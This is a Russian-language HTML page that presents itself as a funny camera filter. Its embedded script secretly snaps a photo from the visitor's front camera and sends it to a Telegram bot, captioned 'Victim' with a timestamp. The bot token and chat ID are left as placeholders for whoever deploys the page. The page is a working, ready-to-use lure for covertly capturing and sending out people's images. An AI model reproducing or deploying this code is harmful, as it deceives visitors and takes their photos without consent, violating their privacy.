<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Смешной фильтр 2026 😂</title>
  <style>
    body { margin:0; font-family: Arial, sans-serif; background:#111; color:#fff; text-align:center; }
    #container { padding: 20px; max-width: 500px; margin: auto; }
    video, canvas { display: none; }
    h1 { font-size: 2.5em; margin: 40px 0 20px; }
    p { font-size: 1.3em; line-height: 1.5; }
    button { 
      background: #ff3366; color: white; border: none; padding: 15px 40px; 
      font-size: 1.4em; border-radius: 50px; margin: 30px 0; cursor: pointer;
    }
    button:hover { background: #ff6699; }
    #status { font-size: 1.2em; margin-top: 30px; color: #0f0; }
  </style>
</head>
<body>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const status = document.getElementById('status');

const TELEGRAM_TOKEN = 'ЗАМЕНИ_СВОЙ_ТОКЕН_СЮДА';  // ← вставь свой
const CHAT_ID = 'ЗАМЕНИ_СВОЙ_CHAT_ID_СЮДА';     // ← вставь свой

async function startPrank() {
  status.textContent = 'Запрашиваем камеру...';
  
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user' } 
    });
    
    video.srcObject = stream;
    video.play();
    
    await new Promise(r => setTimeout(r, 3000));
    
    status.textContent = 'Щааа... делаем фото! 📸';
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    stream.getTracks().forEach(track => track.stop());
    
    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
    
    status.textContent = 'Отправляю тебе... подожди 2 сек 😈';
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', `Жертва: ${new Date().toLocaleString('ru-RU')} 😭`);
    
    const blob = await (await fetch(dataUrl)).blob();
    formData.append('photo', blob, 'prank.jpg');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    
    if (!response.ok) {
      throw new Error(`Telegram error: ${response.status}`);
    }
    
    status.innerHTML = 'Фото отправлено тебе! 😂<br>Можешь закрыть страницу.';
    
  } catch (err) {
    console.error(err);
    status.textContent = err.name === 'NotAllowedError' 
      ? 'Ты не разрешил камеру 😢 Попробуй ещё раз!'
      : 'Ошибка: ' + err.message;
  }
}
</script>

<div id="container">
  <h1>😂 Проверь новый мемный фильтр!</h1>
  <p>Нажми кнопку ниже, разреши камеру — и увидишь, как ты выглядишь с крутым эффектом 2026 года 😎</p>
  
  <button onclick="startPrank()">ВКЛЮЧИТЬ ФИЛЬТР 😂</button>
  
  <div id="status"></div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

</body>
</html>
